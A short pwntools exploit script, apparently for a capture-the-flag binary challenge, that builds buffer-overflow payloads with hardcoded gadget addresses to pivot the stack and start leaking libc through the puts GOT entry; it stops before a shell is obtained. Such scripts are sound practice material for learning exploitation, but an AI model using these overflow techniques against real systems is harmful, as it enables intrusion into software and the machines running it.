#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("addr", 1337)
        
    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)

    return r


r = conn()
input()
#############
# Leak libc #
#############
main = 0x40123b
lea_rax_rbp_0x40 = 0x40127b
mov_rdi_rax = 0x401284
rw_section = 0x404800
fgets = 0x0000000000401274
leave_ret = 0x00000000004012cb
ret = 0x000000000040101a
payload = b'A'*7 + b'\x00' + b'A'*56 + p64(rw_section) +  p64(fgets)
r.sendlineafter(b'Data: ', payload)
payload = b'A'*7 + b'\x00' + b'A'*56 + p64(exe.got['puts'] + 0x40) + p64(0xdeadbeef)
r.sendline(payload)
# pause()
# good luck pwning :)

r.interactive()


